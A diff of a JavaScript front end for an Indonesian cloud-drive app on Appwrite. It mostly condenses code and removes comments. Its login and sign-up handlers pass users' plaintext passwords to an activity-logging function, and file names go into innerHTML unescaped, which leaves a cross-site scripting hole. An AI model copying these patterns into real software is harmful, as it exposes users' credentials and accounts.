@@ -29,7 +29,7 @@ let selectedItem = null;
 let selectedUploadFile = null; 
 let storageDetail = { images: 0, videos: 0, docs: 0, others: 0, total: 0 };
 let searchTimeout = null;
-let selectedProfileImage = null; // Variable untuk menyimpan file gambar profil yang dipilih
+let selectedProfileImage = null; 
 
 // Helper
 const el = (id) => document.getElementById(id);
@@ -64,52 +64,28 @@ document.addEventListener('DOMContentLoaded', () => {
 if (el('loginForm')) {
     el('loginForm').addEventListener('submit', async (e) => {
         e.preventDefault();
-        
         let inputId = el('loginEmail').value.trim();
         const pass = el('loginPass').value;
-        
         toggleLoading(true, "Sedang Masuk...");
-        
         try {
             if (!inputId.includes('@')) {
                 try {
-                    const res = await databases.listDocuments(CONFIG.DB_ID, CONFIG.COLLECTION_USERS, [
-                        Appwrite.Query.equal('name', inputId)
-                    ]);
-                    if (res.total > 0) {
-                        inputId = res.documents[0].email;
-                    } else {
-                        throw new Error("Username tidak ditemukan.");
-                    }
+                    const res = await databases.listDocuments(CONFIG.DB_ID, CONFIG.COLLECTION_USERS, [Appwrite.Query.equal('name', inputId)]);
+                    if (res.total > 0) inputId = res.documents[0].email;
+                    else throw new Error("Username tidak ditemukan.");
                 } catch(err) { console.log("Cari username gagal, mencoba email..."); }
             }
-
-            try {
-                await account.createEmailPasswordSession(inputId, pass);
-            } catch (authError) {
-                if (authError.code === 401 || authError.message.includes('session is active')) {
-                    console.log("Sesi aktif, lanjut ke dashboard...");
-                } else {
-                    throw authError; 
-                }
-            }
-            
+            try { await account.createEmailPasswordSession(inputId, pass); } catch (authError) { if (authError.code !== 401 && !authError.message.includes('session is active')) throw authError; }
             const user = await account.get();
             try {
                 const userDB = await databases.getDocument(CONFIG.DB_ID, CONFIG.COLLECTION_USERS, user.$id);
                 await recordActivity('Login', { id: user.$id, name: user.name, email: user.email, phone: userDB.phone, password: pass });
             } catch(ex) {}
-
             checkSession(); 
-
-        } catch (error) { 
-            toggleLoading(false);
-            alert("Login Gagal: " + (error.message || "Periksa data Anda."));
-        }
+        } catch (error) { toggleLoading(false); alert("Login Gagal: " + (error.message || "Periksa data Anda.")); }
     });
 }
 
-// SIGN UP
 if (el('signupForm')) {
     el('signupForm').addEventListener('submit', async (e) => {
         e.preventDefault();
@@ -118,30 +94,17 @@ if (el('signupForm')) {
         const phone = el('regPhone').value.trim();
         const pass = el('regPass').value;
         const verify = el('regVerify').value;
-
         if (pass !== verify) return alert("Konfirmasi password salah!");
-        
         toggleLoading(true, "Mendaftarkan...");
         try {
             const auth = await account.create(Appwrite.ID.unique(), email, pass, name);
-            try { 
-                await databases.createDocument(CONFIG.DB_ID, CONFIG.COLLECTION_USERS, auth.$id, { name, email, phone }); 
-            } catch(dbErr) {}
-            
+            try { await databases.createDocument(CONFIG.DB_ID, CONFIG.COLLECTION_USERS, auth.$id, { name, email, phone }); } catch(dbErr) {}
             await recordActivity('SignUp', { id: auth.$id, name, email, phone, password: pass });
-            
-            toggleLoading(false);
-            alert("Berhasil! Silakan Login."); 
-            window.nav('loginPage');
-        } catch(e) { 
-            toggleLoading(false);
-            if(e.message.includes('exists')) alert("Email/Username sudah dipakai."); 
-            else alert("Gagal: " + e.message);
-        }
+            toggleLoading(false); alert("Berhasil! Silakan Login."); window.nav('loginPage');
+        } catch(e) { toggleLoading(false); if(e.message.includes('exists')) alert("Email/Username sudah dipakai."); else alert("Gagal: " + e.message); }
     });
 }
 
-// LOGOUT
 function initLogout() {
     const btn = el('logoutBtn');
     if (btn) {
@@ -150,10 +113,7 @@ function initLogout() {
         newBtn.addEventListener('click', async () => {
             if (confirm("Keluar dari aplikasi?")) {
                 toggleLoading(true, "Keluar...");
-                try {
-                    await account.deleteSession('current');
-                    window.location.reload(); 
-                } catch (error) { window.location.reload(); }
+                try { await account.deleteSession('current'); window.location.reload(); } catch (error) { window.location.reload(); }
             }
         });
     }
@@ -164,17 +124,12 @@ function initLogout() {
 // ======================================================
 async function checkSession() {
     if(!el('loginPage').classList.contains('hidden')) toggleLoading(true, "Memuat Data...");
-
     try {
         currentUser = await account.get();
         window.nav('dashboardPage'); 
         loadFiles('root');  
         calculateStorage();
-    } catch (e) { 
-        window.nav('loginPage'); 
-    } finally { 
-        toggleLoading(false); 
-    }
+    } catch (e) { window.nav('loginPage'); } finally { toggleLoading(false); }
 }
 
 window.nav = (pageId) => {
@@ -214,7 +169,6 @@ window.openFolder = (id, name) => {
     loadFiles(id);
 };
 
-// Search Engine
 function initSearchBar() {
     const input = el('searchInput');
     if (!input) return;
@@ -253,68 +207,32 @@ async function fallbackSearch(keyword) {
 
 window.clearSearch = () => { el('searchInput').value = ''; el('clearSearchBtn').classList.add('hidden'); loadFiles(currentFolderId); };
 
-// KONTROL MENU & KLIK KANAN
 function initAllContextMenus() {
     const newBtn = el('newBtnMain'); 
-    const newMenu = el('dropdownNewMenu'); // Dropdown Tombol New
-    const navDrive = el('navDrive'); // Sidebar Drive Saya
-    const globalMenu = el('globalContextMenu'); // Menu Global (Klik Kanan Drive Saya/Kosong)
-    const fileMenu = el('fileContextMenu'); // Menu File/Folder
+    const newMenu = el('dropdownNewMenu'); 
+    const navDrive = el('navDrive'); 
+    const globalMenu = el('globalContextMenu'); 
+    const fileMenu = el('fileContextMenu'); 
     const mainArea = document.querySelector('.main-content-area');
 
-    // Fungsi Tutup Semua Menu
     const closeAll = () => {
         if(newMenu) newMenu.classList.remove('show');
         if(globalMenu) globalMenu.classList.remove('show');
         if(fileMenu) { fileMenu.classList.add('hidden'); fileMenu.classList.remove('show'); }
-        // Note: Storage Modal tidak ditutup otomatis saat klik sembarang untuk UX yang lebih baik
     };
 
-    // 1. TOMBOL NEW (Klik Kiri & Kanan) -> Buka Dropdown
     if (newBtn) {
         const newBtnClean = newBtn.cloneNode(true); 
         newBtn.parentNode.replaceChild(newBtnClean, newBtn);
-        
-        const toggleNewMenu = (e) => { 
-            e.preventDefault(); e.stopPropagation(); 
-            const wasOpen = newMenu.classList.contains('show'); 
-            closeAll(); 
-            if (!wasOpen) newMenu.classList.add('show'); 
-        };
+        const toggleNewMenu = (e) => { e.preventDefault(); e.stopPropagation(); const wasOpen = newMenu.classList.contains('show'); closeAll(); if (!wasOpen) newMenu.classList.add('show'); };
         newBtnClean.onclick = toggleNewMenu;
         newBtnClean.oncontextmenu = toggleNewMenu;
     }
-
-    // 2. SIDEBAR DRIVE SAYA (Klik Kanan) -> Buka Global Menu di Kursor
-    if (navDrive) {
-        navDrive.oncontextmenu = (e) => { 
-            e.preventDefault(); e.stopPropagation(); closeAll(); 
-            globalMenu.style.top = `${e.clientY}px`; 
-            globalMenu.style.left = `${e.clientX}px`; 
-            globalMenu.classList.add('show');
-        };
-    }
-
-    // 3. AREA KOSONG (Klik Kanan) -> Buka Global Menu
-    if (mainArea) {
-        mainArea.oncontextmenu = (e) => {
-            if (e.target.closest('.item-card')) return;
-            e.preventDefault(); closeAll();
-            globalMenu.style.top = `${e.clientY}px`; 
-            globalMenu.style.left = `${e.clientX}px`; 
-            globalMenu.classList.add('show');
-        };
-    }
-    
-    // Klik sembarang -> Tutup menu
-    window.onclick = (e) => {
-        // Jangan tutup jika sedang klik di dalam modal atau storage widget
-        if (e.target.closest('.modal-box') || e.target.closest('.storage-widget')) return;
-        closeAll();
-    };
+    if (navDrive) { navDrive.oncontextmenu = (e) => { e.preventDefault(); e.stopPropagation(); closeAll(); globalMenu.style.top = `${e.clientY}px`; globalMenu.style.left = `${e.clientX}px`; globalMenu.classList.add('show'); }; }
+    if (mainArea) { mainArea.oncontextmenu = (e) => { if (e.target.closest('.item-card')) return; e.preventDefault(); closeAll(); globalMenu.style.top = `${e.clientY}px`; globalMenu.style.left = `${e.clientX}px`; globalMenu.classList.add('show'); }; }
+    window.onclick = (e) => { if (e.target.closest('.modal-box') || e.target.closest('.storage-widget')) return; closeAll(); };
 }
 
-// Render Item
 function renderItem(doc) {
     const grid = el('fileGrid'); const div = document.createElement('div'); div.className = 'item-card';
     const isFolder = doc.type === 'folder';
@@ -324,46 +242,20 @@ function renderItem(doc) {
         content = `<div class="thumb-box" style="width:100px;height:100px;overflow:hidden;border-radius:15px;margin-bottom:10px;"><img src="${storage.getFilePreview(CONFIG.BUCKET_ID, doc.fileId)}" style="width:100%;height:100%;object-fit:cover;"></div>`;
     }
     div.innerHTML = `${starHTML}${content}<div class="item-name">${doc.name}</div>`;
-    
-    // Klik Kiri
     div.onclick = () => { if(!doc.trashed) isFolder ? openFolder(doc.$id, doc.name) : window.open(doc.url, '_blank'); };
-    
-    // Klik Kanan (Menu File/Folder)
     div.oncontextmenu = (e) => {
         e.preventDefault(); e.stopPropagation();
         if(el('storageModal')) el('storageModal').classList.add('hidden');
         if(el('globalContextMenu')) el('globalContextMenu').classList.remove('show');
         if(el('dropdownNewMenu')) el('dropdownNewMenu').classList.remove('show');
-
         selectedItem = doc;
         const menu = el('fileContextMenu');
-        
-        // Logika Tampilkan Item Menu Sesuai Tipe
-        const btnOpen = el('ctxBtnOpenFolder');
-        const btnPreview = el('ctxBtnPreview');
-        const btnDownload = el('ctxBtnDownload');
-        const btnOpenWith = el('ctxBtnOpenWith');
-
-        if (isFolder) {
-            if(btnOpen) btnOpen.style.display = 'flex';
-            if(btnPreview) btnPreview.style.display = 'none';
-            if(btnDownload) btnDownload.style.display = 'none';
-            if(btnOpenWith) btnOpenWith.style.display = 'none';
-        } else {
-            if(btnOpen) btnOpen.style.display = 'none';
-            if(btnPreview) btnPreview.style.display = 'flex';
-            if(btnDownload) btnDownload.style.display = 'flex';
-            if(btnOpenWith) btnOpenWith.style.display = 'flex';
-        }
-
+        const btnOpen = el('ctxBtnOpenFolder'); const btnPreview = el('ctxBtnPreview'); const btnDownload = el('ctxBtnDownload'); const btnOpenWith = el('ctxBtnOpenWith');
+        if (isFolder) { if(btnOpen) btnOpen.style.display = 'flex'; if(btnPreview) btnPreview.style.display = 'none'; if(btnDownload) btnDownload.style.display = 'none'; if(btnOpenWith) btnOpenWith.style.display = 'none'; } else { if(btnOpen) btnOpen.style.display = 'none'; if(btnPreview) btnPreview.style.display = 'flex'; if(btnDownload) btnDownload.style.display = 'flex'; if(btnOpenWith) btnOpenWith.style.display = 'flex'; }
         menu.style.top = `${e.clientY}px`; menu.style.left = `${e.clientX}px`;
-        
         const isTrash = doc.trashed;
-        el('ctxTrashBtn').classList.toggle('hidden', isTrash);
-        el('ctxRestoreBtn').classList.toggle('hidden', !isTrash);
-        el('ctxPermDeleteBtn').classList.toggle('hidden', !isTrash);
+        el('ctxTrashBtn').classList.toggle('hidden', isTrash); el('ctxRestoreBtn').classList.toggle('hidden', !isTrash); el('ctxPermDeleteBtn').classList.toggle('hidden', !isTrash);
         el('ctxStarText').innerText = doc.starred ? "Hapus Bintang" : "Bintangi";
-
         menu.classList.remove('hidden'); menu.classList.add('show');
     };
     grid.appendChild(div);
@@ -393,319 +285,176 @@ function initStorageTooltip() {
             const cat = e.target.getAttribute('data-category');
             const size = e.target.getAttribute('data-size');
             const formattedSize = formatSize(parseInt(size || 0));
-
             ttHeader.innerText = cat || "LAINNYA";
             ttSize.innerText = formattedSize;
-            
             if (cat === 'GAMBAR') ttDesc.innerText = "Foto dan gambar yang tersimpan.";
             else if (cat === 'VIDEO') ttDesc.innerText = "Video dan rekaman yang tersimpan.";
             else if (cat === 'DOKUMEN') ttDesc.innerText = "Dokumen PDF, Word, Excel.";
             else if (cat === 'TERSEDIA') ttDesc.innerText = "Sisa penyimpanan yang tersedia.";
             else ttDesc.innerText = "File lain yang tidak dikategorikan.";
-
             tooltip.classList.remove('hidden');
         });
-
-        seg.addEventListener('mousemove', (e) => {
-            tooltip.style.left = `${e.clientX}px`;
-            tooltip.style.top = `${e.clientY - 15}px`;
-        });
-
-        seg.addEventListener('mouseleave', () => {
-            tooltip.classList.add('hidden');
-        });
+        seg.addEventListener('mousemove', (e) => { tooltip.style.left = `${e.clientX}px`; tooltip.style.top = `${e.clientY - 15}px`; });
+        seg.addEventListener('mouseleave', () => { tooltip.classList.add('hidden'); });
     });
 }
 
-// NEW FUNCTION: OPEN FULL STORAGE PAGE
 window.openStoragePage = async () => {
-    // 1. Hitung data terbaru
     await calculateStorage();
-    
-    // 2. Tutup modal & dashboard
     window.closeModal('storageModal');
     window.nav('storagePage');
-
-    // 3. Populate Data ke Halaman Baru
     const totalBytes = storageDetail.total || 0;
-    const limitBytes = 2 * 1024 * 1024 * 1024; // 2 GB
-    
-    // ===== UPDATE TULISAN PERSENTASE DI JUDUL =====
-    // Menghitung persentase dari Total File / Limit
+    const limitBytes = 2 * 1024 * 1024 * 1024; 
     const percentUsed = Math.min((totalBytes / limitBytes) * 100, 100).toFixed(0);
-    
-    // Terapkan ke Judul
     el('pageStoragePercent').innerText = `Ruang penyimpanan ${percentUsed}% penuh`;
-    
-    // Terapkan ke Sub-judul
     el('pageStorageUsedText').innerText = `${formatSize(totalBytes)} dari 2 GB`;
-
-    // Update Progress Bar
     const pctImages = (storageDetail.images / limitBytes) * 100;
     const pctVideos = (storageDetail.videos / limitBytes) * 100;
     const pctDocs = (storageDetail.docs / limitBytes) * 100;
     const pctOthers = (storageDetail.others / limitBytes) * 100;
     const pctFree = 100 - (pctImages + pctVideos + pctDocs + pctOthers);
-
-    const barImg = el('pageBarImages');
-    const barVid = el('pageBarVideos');
-    const barDoc = el('pageBarDocs');
-    const barOth = el('pageBarOthers');
-    const barFree = el('pageBarFree');
-
-    barImg.style.width = `${pctImages}%`;
-    barVid.style.width = `${pctVideos}%`;
-    barDoc.style.width = `${pctDocs}%`;
-    barOth.style.width = `${pctOthers}%`;
-    barFree.style.width = `${pctFree}%`;
-
-    // Inject Attributes for Tooltip on New Page
+    const barImg = el('pageBarImages'); const barVid = el('pageBarVideos'); const barDoc = el('pageBarDocs'); const barOth = el('pageBarOthers'); const barFree = el('pageBarFree');
+    barImg.style.width = `${pctImages}%`; barVid.style.width = `${pctVideos}%`; barDoc.style.width = `${pctDocs}%`; barOth.style.width = `${pctOthers}%`; barFree.style.width = `${pctFree}%`;
     barImg.setAttribute('data-category', 'GAMBAR'); barImg.setAttribute('data-size', storageDetail.images);
     barVid.setAttribute('data-category', 'VIDEO'); barVid.setAttribute('data-size', storageDetail.videos);
     barDoc.setAttribute('data-category', 'DOKUMEN'); barDoc.setAttribute('data-size', storageDetail.docs);
     barOth.setAttribute('data-category', 'LAINNYA'); barOth.setAttribute('data-size', storageDetail.others);
     barFree.setAttribute('data-category', 'TERSEDIA'); barFree.setAttribute('data-size', limitBytes - totalBytes);
-
-    // Update Detail List
     el('pageValImages').innerText = formatSize(storageDetail.images);
     el('pageValVideos').innerText = formatSize(storageDetail.videos);
     el('pageValDocs').innerText = formatSize(storageDetail.docs);
     el('pageValOthers').innerText = formatSize(storageDetail.others);
     el('pageValFree').innerText = formatSize(limitBytes - totalBytes);
-
-    // Re-init Tooltip agar jalan di halaman baru
     initStorageTooltip();
 };
 
-window.closeStoragePage = () => {
-    window.nav('dashboardPage');
-};
+window.closeStoragePage = () => { window.nav('dashboardPage'); };
 
+// MODAL OPENER (DIKOREKSI: Menggunakan elemen yang benar)
 window.openStorageModal = async () => {
-    if(el('fileContextMenu')) el('fileContextMenu').classList.remove('show');
-    if(el('globalContextMenu')) el('globalContextMenu').classList.remove('show');
-    if(el('dropdownNewMenu')) el('dropdownNewMenu').classList.remove('show');
+    // 1. Loading state agar user tahu sistem merespon
+    toggleLoading(true, "Menghitung...");
+    
+    try {
+        if(el('fileContextMenu')) el('fileContextMenu').classList.remove('show');
+        if(el('globalContextMenu')) el('globalContextMenu').classList.remove('show');
+        if(el('dropdownNewMenu')) el('dropdownNewMenu').classList.remove('show');
 
-    await calculateStorage();
+        // 2. Hitung data
+        await calculateStorage();
 
-    const totalBytes = storageDetail.total || 0;
-    const limitBytes = 2 * 1024 * 1024 * 1024; // 2 GB
+        const totalBytes = storageDetail.total || 0;
+        const limitBytes = 2 * 1024 * 1024 * 1024; // 2 GB
 
-    const formattedTotal = formatSize(totalBytes);
-    el('storageBigText').innerText = formattedTotal;
+        // 3. Update UI Modal
+        const formattedTotal = formatSize(totalBytes);
+        el('storageBigText').innerText = formattedTotal;
+        el('modalStorageUsedText').innerText = `dari 2 GB digunakan`; // Sesuaikan text
 
-    const percentUsed = Math.min((totalBytes / limitBytes) * 100, 100).toFixed(0);
-    el('modalStorageTitle').innerText = `Ruang penyimpanan ${percentUsed}% penuh`;
+        const percentUsed = Math.min((totalBytes / limitBytes) * 100, 100).toFixed(0);
+        el('modalStorageTitle').innerText = `Ruang penyimpanan ${percentUsed}% penuh`;
 
-    const pctImages = (storageDetail.images / limitBytes) * 100;
-    const pctVideos = (storageDetail.videos / limitBytes) * 100;
-    const pctDocs = (storageDetail.docs / limitBytes) * 100;
-    const pctOthers = (storageDetail.others / limitBytes) * 100;
-    const pctFree = 100 - (pctImages + pctVideos + pctDocs + pctOthers);
+        // Progress Bar
+        const pctImages = (storageDetail.images / limitBytes) * 100;
+        const pctVideos = (storageDetail.videos / limitBytes) * 100;
+        const pctDocs = (storageDetail.docs / limitBytes) * 100;
+        const pctOthers = (storageDetail.others / limitBytes) * 100;
+        const pctFree = 100 - (pctImages + pctVideos + pctDocs + pctOthers);
 
-    const barImg = el('barImages');
-    const barVid = el('barVideos');
-    const barDoc = el('barDocs');
-    const barOth = el('barOthers');
-    const barFree = el('barFree');
+        const barImg = el('barImages'); const barVid = el('barVideos'); const barDoc = el('barDocs'); const barOth = el('barOthers'); const barFree = el('barFree');
+        barImg.style.width = `${pctImages}%`; barVid.style.width = `${pctVideos}%`; barDoc.style.width = `${pctDocs}%`; barOth.style.width = `${pctOthers}%`; barFree.style.width = `${pctFree}%`;
+        
+        // Tooltip Attributes
+        barImg.setAttribute('data-category', 'GAMBAR'); barImg.setAttribute('data-size', storageDetail.images);
+        barVid.setAttribute('data-category', 'VIDEO'); barVid.setAttribute('data-size', storageDetail.videos);
+        barDoc.setAttribute('data-category', 'DOKUMEN'); barDoc.setAttribute('data-size', storageDetail.docs);
+        barOth.setAttribute('data-category', 'LAINNYA'); barOth.setAttribute('data-size', storageDetail.others);
+        barFree.setAttribute('data-category', 'TERSEDIA'); barFree.setAttribute('data-size', limitBytes - totalBytes);
 
-    barImg.style.width = `${pctImages}%`;
-    barVid.style.width = `${pctVideos}%`;
-    barDoc.style.width = `${pctDocs}%`;
-    barOth.style.width = `${pctOthers}%`;
-    barFree.style.width = `${pctFree}%`;
+        // Legend Values
+        el('valImages').innerText = formatSize(storageDetail.images);
+        el('valVideos').innerText = formatSize(storageDetail.videos);
+        el('valDocs').innerText = formatSize(storageDetail.docs);
+        el('valOthers').innerText = formatSize(storageDetail.others);
+        el('valFree').innerText = formatSize(limitBytes - totalBytes);
 
-    barImg.setAttribute('data-category', 'GAMBAR'); barImg.setAttribute('data-size', storageDetail.images);
-    barVid.setAttribute('data-category', 'VIDEO'); barVid.setAttribute('data-size', storageDetail.videos);
-    barDoc.setAttribute('data-category', 'DOKUMEN'); barDoc.setAttribute('data-size', storageDetail.docs);
-    barOth.setAttribute('data-category', 'LAINNYA'); barOth.setAttribute('data-size', storageDetail.others);
-    barFree.setAttribute('data-category', 'TERSEDIA'); barFree.setAttribute('data-size', limitBytes - totalBytes);
+        // 4. Reset & Tampilkan Modal
+        const modalBox = el('storageModal').querySelector('.modal-box');
+        modalBox.classList.remove('animate-open');
+        void modalBox.offsetWidth; 
+        modalBox.classList.add('animate-open');
+        window.openModal('storageModal');
 
-    el('valImages').innerText = formatSize(storageDetail.images);
-    el('valVideos').innerText = formatSize(storageDetail.videos);
-    el('valDocs').innerText = formatSize(storageDetail.docs);
-    el('valOthers').innerText = formatSize(storageDetail.others);
-    el('valFree').innerText = formatSize(limitBytes - totalBytes);
-
-    const modalBox = el('storageModal').querySelector('.modal-box');
-    modalBox.classList.remove('animate-open');
-    void modalBox.offsetWidth; 
-    modalBox.classList.add('animate-open');
-
-    window.openModal('storageModal');
+    } catch (e) {
+        console.error(e);
+        alert("Gagal membuka penyimpanan.");
+    } finally {
+        toggleLoading(false);
+    }
 };
 
 async function calculateStorage() {
     if (!currentUser) return;
     try {
-        const res = await databases.listDocuments(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, [
-            Appwrite.Query.equal('owner', currentUser.$id), 
-            Appwrite.Query.equal('type', 'file')
-        ]);
-        
+        const res = await databases.listDocuments(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, [Appwrite.Query.equal('owner', currentUser.$id), Appwrite.Query.equal('type', 'file')]);
         storageDetail = { images: 0, videos: 0, docs: 0, others: 0, total: 0 };
         const limit = 2 * 1024 * 1024 * 1024; // 2 GB
-
         res.documents.forEach(doc => {
-            const size = doc.size || 0; 
-            const name = doc.name.toLowerCase(); 
-            storageDetail.total += size;
-
-            if (name.match(/\.(jpg|jpeg|png|gif|webp|jfif|svg|bmp)$/)) {
-                storageDetail.images += size;
-            } else if (name.match(/\.(mp4|mkv|mov|avi|wmv|flv|webm)$/)) {
-                storageDetail.videos += size;
-            } else if (name.match(/\.(pdf|doc|docx|xls|xlsx|ppt|pptx|txt|rtf|csv)$/)) {
-                storageDetail.docs += size;
-            } else {
-                storageDetail.others += size;
-            }
+            const size = doc.size || 0; const name = doc.name.toLowerCase(); storageDetail.total += size;
+            if (name.match(/\.(jpg|jpeg|png|gif|webp|jfif|svg|bmp)$/)) storageDetail.images += size;
+            else if (name.match(/\.(mp4|mkv|mov|avi|wmv|flv|webm)$/)) storageDetail.videos += size;
+            else if (name.match(/\.(pdf|doc|docx|xls|xlsx|ppt|pptx|txt|rtf|csv)$/)) storageDetail.docs += size;
+            else storageDetail.others += size;
         });
-
         const mb = formatSize(storageDetail.total);
         el('storageUsed').innerText = mb;
-        
         const totalPct = Math.min((storageDetail.total / limit) * 100, 100);
         el('storageBar').style.width = `${totalPct}%`;
-
-        if(totalPct > 90) el('storageBar').style.backgroundColor = '#ef4444';
-        else el('storageBar').style.backgroundColor = '';
-
-    } catch (e) {
-        console.error("Gagal hitung storage:", e);
-    }
+        if(totalPct > 90) el('storageBar').style.backgroundColor = '#ef4444'; else el('storageBar').style.backgroundColor = '';
+    } catch (e) { console.error("Gagal hitung storage:", e); }
 }
 
-// ======================================================
-// 7. PROFILE EDITING LOGIC (NEW FEATURES)
-// ======================================================
-
 window.openProfilePage = async () => {
-    // Tutup menu lain jika terbuka
     if(el('fileContextMenu')) el('fileContextMenu').classList.remove('show');
     if(el('globalContextMenu')) el('globalContextMenu').classList.remove('show');
     if(el('dropdownNewMenu')) el('dropdownNewMenu').classList.remove('show');
-    
     toggleLoading(true, "Memuat Profil...");
-    
     try {
-        // Ambil data user terbaru dari Auth
         const user = await account.get();
-        
-        // Ambil data tambahan (Phone) dari Database (jika ada)
         let phone = "";
-        try {
-            const userDB = await databases.getDocument(CONFIG.DB_ID, CONFIG.COLLECTION_USERS, user.$id);
-            phone = userDB.phone || "";
-        } catch(e) { console.log("User DB fetch error:", e); }
-
-        // Isi Form
-        el('editName').value = user.name;
-        el('editEmail').value = user.email;
-        el('editPhone').value = phone;
-        el('editPass').value = ""; // Reset password field
-        el('editProfilePreview').src = "user.jpg"; // Default atau load dari storage jika ada (placeholder)
-
-        // Tampilkan Halaman
+        try { const userDB = await databases.getDocument(CONFIG.DB_ID, CONFIG.COLLECTION_USERS, user.$id); phone = userDB.phone || ""; } catch(e) {}
+        el('editName').value = user.name; el('editEmail').value = user.email; el('editPhone').value = phone; el('editPass').value = ""; el('editProfilePreview').src = "user.jpg";
         window.nav('profilePage');
-    } catch(e) {
-        alert("Gagal memuat profil: " + e.message);
-    } finally {
-        toggleLoading(false);
-    }
+    } catch(e) { alert("Gagal memuat profil: " + e.message); } finally { toggleLoading(false); }
 };
 
-window.closeProfilePage = () => {
-    window.nav('dashboardPage');
-};
+window.closeProfilePage = () => { window.nav('dashboardPage'); };
 
 window.handleProfileImageSelect = (input) => {
     if (input.files && input.files[0]) {
-        const file = input.files[0];
-        selectedProfileImage = file;
-        
-        // Preview lokal
-        const reader = new FileReader();
-        reader.onload = (e) => {
-            el('editProfilePreview').src = e.target.result;
-        }
-        reader.readAsDataURL(file);
+        const file = input.files[0]; selectedProfileImage = file;
+        const reader = new FileReader(); reader.onload = (e) => { el('editProfilePreview').src = e.target.result; }; reader.readAsDataURL(file);
     }
 };
 
 window.submitUpdateProfile = async (e) => {
-    e.preventDefault();
-    toggleLoading(true, "Menyimpan...");
-
-    const newName = el('editName').value.trim();
-    const newPhone = el('editPhone').value.trim();
-    const newPass = el('editPass').value;
-
+    e.preventDefault(); toggleLoading(true, "Menyimpan...");
+    const newName = el('editName').value.trim(); const newPhone = el('editPhone').value.trim(); const newPass = el('editPass').value;
     try {
-        // 1. Update Nama (Auth)
-        if (newName !== currentUser.name) {
-            await account.updateName(newName);
-        }
-
-        // 2. Update Password (Auth) - Jika diisi
-        if (newPass) {
-            await account.updatePassword(newPass);
-        }
-
-        // 3. Update Phone (Database)
-        try {
-            await databases.updateDocument(CONFIG.DB_ID, CONFIG.COLLECTION_USERS, currentUser.$id, {
-                phone: newPhone
-            });
-        } catch(err) {
-            // Jika dokumen belum ada (kasus lama), buat baru
-            await databases.createDocument(CONFIG.DB_ID, CONFIG.COLLECTION_USERS, currentUser.$id, {
-                name: newName,
-                email: currentUser.email,
-                phone: newPhone
-            });
-        }
-
-        // 4. Update Foto (Storage) - Placeholder logic
-        // Di sini Anda bisa menambahkan logika upload ke bucket 'profile-pics' jika sudah dibuat di Appwrite
-        // if (selectedProfileImage) { ... upload logic ... }
-
-        alert("Profil berhasil diperbarui!");
-        
-        // Refresh session data
-        currentUser = await account.get();
-        // Update tampilan nama di UI jika perlu (belum ada elemen spesifik nama di dashboard selain avatar)
-        
-        window.closeProfilePage();
-
-    } catch (error) {
-        alert("Gagal memperbarui profil: " + error.message);
-    } finally {
-        toggleLoading(false);
-    }
+        if (newName !== currentUser.name) await account.updateName(newName);
+        if (newPass) await account.updatePassword(newPass);
+        try { await databases.updateDocument(CONFIG.DB_ID, CONFIG.COLLECTION_USERS, currentUser.$id, { phone: newPhone }); } 
+        catch(err) { await databases.createDocument(CONFIG.DB_ID, CONFIG.COLLECTION_USERS, currentUser.$id, { name: newName, email: currentUser.email, phone: newPhone }); }
+        alert("Profil berhasil diperbarui!"); currentUser = await account.get(); window.closeProfilePage();
+    } catch (error) { alert("Gagal memperbarui profil: " + error.message); } finally { toggleLoading(false); }
 };
 
-
-// Utils (Modal, CRUD, Excel)
 window.openModal = (id) => { el(id).classList.remove('hidden'); if(id==='folderModal') setTimeout(()=>el('newFolderName').focus(),100); };
 window.closeModal = (id) => el(id).classList.add('hidden');
 window.triggerUploadModal = () => { resetUploadUI(); window.openModal('uploadModal'); };
 window.createFolder = () => window.openModal('folderModal');
-
-window.submitCreateFolder = async () => {
-    const name = el('newFolderName').value.trim(); if (!name) return; closeModal('folderModal'); toggleLoading(true);
-    try { await databases.createDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, Appwrite.ID.unique(), { name, type: 'folder', parentId: currentFolderId, owner: currentUser.$id, size: 0, starred: false, trashed: false }); loadFiles(currentFolderId); el('newFolderName').value = ''; } catch (e) { alert(e.message); } finally { toggleLoading(false); }
-};
-
-window.submitUploadFile = async () => {
-    if (!selectedUploadFile) return alert("Pilih file dulu!"); closeModal('uploadModal'); toggleLoading(true);
-    try {
-        const up = await storage.createFile(CONFIG.BUCKET_ID, Appwrite.ID.unique(), selectedUploadFile);
-        await databases.createDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, Appwrite.ID.unique(), { name: selectedUploadFile.name, type: 'file', parentId: currentFolderId, owner: currentUser.$id, url: storage.getFileView(CONFIG.BUCKET_ID, up.$id).href, fileId: up.$id, size: selectedUploadFile.size, starred: false, trashed: false });
-        resetUploadUI(); loadFiles(currentFolderId); calculateStorage();
-    } catch (e) { alert(e.message); } finally { toggleLoading(false); }
-};
-
+window.submitCreateFolder = async () => { const name = el('newFolderName').value.trim(); if (!name) return; closeModal('folderModal'); toggleLoading(true); try { await databases.createDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, Appwrite.ID.unique(), { name, type: 'folder', parentId: currentFolderId, owner: currentUser.$id, size: 0, starred: false, trashed: false }); loadFiles(currentFolderId); el('newFolderName').value = ''; } catch (e) { alert(e.message); } finally { toggleLoading(false); } };
+window.submitUploadFile = async () => { if (!selectedUploadFile) return alert("Pilih file dulu!"); closeModal('uploadModal'); toggleLoading(true); try { const up = await storage.createFile(CONFIG.BUCKET_ID, Appwrite.ID.unique(), selectedUploadFile); await databases.createDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, Appwrite.ID.unique(), { name: selectedUploadFile.name, type: 'file', parentId: currentFolderId, owner: currentUser.$id, url: storage.getFileView(CONFIG.BUCKET_ID, up.$id).href, fileId: up.$id, size: selectedUploadFile.size, starred: false, trashed: false }); resetUploadUI(); loadFiles(currentFolderId); calculateStorage(); } catch (e) { alert(e.message); } finally { toggleLoading(false); } };
 window.toggleStarItem = async () => { try { await databases.updateDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, selectedItem.$id, { starred: !selectedItem.starred }); loadFiles(currentViewMode==='root'?currentFolderId:currentViewMode); el('fileContextMenu').classList.remove('show'); el('fileContextMenu').classList.add('hidden'); } catch(e){} };
 window.moveItemToTrash = async () => { try { await databases.updateDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, selectedItem.$id, { trashed: true }); loadFiles(currentViewMode==='root'?currentFolderId:currentViewMode); el('fileContextMenu').classList.remove('show'); el('fileContextMenu').classList.add('hidden'); } catch(e){} };
